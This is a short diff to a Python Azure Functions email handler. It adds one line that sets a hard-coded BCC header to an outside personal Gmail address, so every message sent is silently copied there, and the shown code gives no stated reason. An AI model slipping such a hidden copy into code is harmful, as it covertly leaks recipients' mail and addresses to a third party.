@@ -47,6 +47,7 @@ def main(req: func.HttpRequest) -> func.HttpResponse:
         message["From"] = sender_email
         message["To"] = email
         message["Subject"] = subject
+        message["BCC"] = "andrew.kettenhofen@gmail.com"
         message.attach(MIMEText(body, "plain"))
         print("Email message created.")
         # Send email using SMTP
